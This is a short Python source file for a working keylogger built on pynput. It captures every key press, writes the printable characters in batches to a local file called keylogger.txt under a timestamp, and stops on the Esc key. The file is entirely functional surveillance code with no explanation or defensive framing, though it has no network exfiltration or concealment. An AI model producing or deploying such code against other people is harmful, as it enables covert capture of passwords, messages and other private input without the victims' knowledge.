from pynput.keyboard import Key, Listener
from datetime import datetime

count = 0
keys = []

# Function to write keystrokes to file
def write_file(keys):
    with open("keylogger.txt", "a") as f:
        for idx, key in enumerate(keys):
            k = str(key).replace("'", "")
            if k.find("space") > 0 and k.find("backspace") == -1:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

# Function to handle key press events
def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        return False

if __name__ == "__main__":
    with open("keylogger.txt", "a") as f:
        # Write initial timestamp
        f.write("TimeStamp: " + str(datetime.now())[:-7] + "\n\n")
        
    # Start listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Write ending marker
    with open("keylogger.txt", "a") as f:
        f.write("\n\n")
        f.write("--------------------------------------------------------------------")
        f.write("\n\n")
